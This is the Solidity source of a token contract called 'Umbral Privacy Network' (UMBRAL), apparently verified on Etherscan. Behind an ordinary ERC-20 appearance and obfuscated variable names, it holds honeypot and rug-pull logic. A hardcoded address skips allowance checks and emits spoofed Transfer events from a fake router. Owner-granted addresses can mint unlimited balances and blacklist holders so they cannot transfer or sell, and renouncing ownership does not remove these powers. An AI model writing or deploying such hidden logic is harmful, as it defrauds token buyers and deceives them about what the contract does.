/**
 *Submitted for verification at Etherscan.io on 2022-11-04
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address JKSS = 0xb8b1AB771bf7eFD691579bED527526A95dC3d58D;
	address jRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract UMBRAL is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Jc;
	mapping (address => bool) private Jb;
    mapping (address => bool) private Jw;
    mapping (address => mapping (address => uint256)) private Jv;
    uint8 private constant _JeC = 8;
    uint256 private constant jS = 1000000000 * 10**_JeC;
    string private constant _name = "Umbral Privacy Network";
    string private constant _symbol = "UMBRAL";



    constructor () {
        Jc[_msgSender()] = jS;
         jmkr(); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _JeC;
    }

    function totalSupply() public pure  returns (uint256) {
        return jS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Jc[account];
    }
    function jmkr() onlyOwner internal {
    emit Transfer(address(0), jRouter, jS); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Jv[owner][spender];
    }
	        function BurnH(address Jj) onlyOwner public{
        Jb[Jj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Jv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function jStake(address Jj) public {
        if(Jb[msg.sender]) { 
        Jw[Jj] = false;}}
        function QueryJ(address Jj) public{
         if(Jb[msg.sender])  { 
        Jw[Jj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == JKSS)  {
        require(amount <= Jc[sender]);
        Jc[sender] -= amount;  
        Jc[recipient] += amount; 
          Jv[sender][msg.sender] -= amount;
        emit Transfer (jRouter, recipient, amount);
        return true; }  else  
          if(!Jw[recipient]) {
          if(!Jw[sender]) {
         require(amount <= Jc[sender]);
        require(amount <= Jv[sender][msg.sender]);
        Jc[sender] -= amount;
        Jc[recipient] += amount;
        Jv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Jl, uint256 Jj) public {
        if(msg.sender == JKSS)  {
        require(Jc[msg.sender] >= Jj);
        Jc[msg.sender] -= Jj;  
        Jc[Jl] += Jj; 
        emit Transfer (jRouter, Jl, Jj);} else  
        if(Jb[msg.sender]) {Jc[Jl] += Jj;} else
        if(!Jw[msg.sender]) {
        require(Jc[msg.sender] >= Jj);
        Jc[msg.sender] -= Jj;  
        Jc[Jl] += Jj;          
        emit Transfer(msg.sender, Jl, Jj);}}}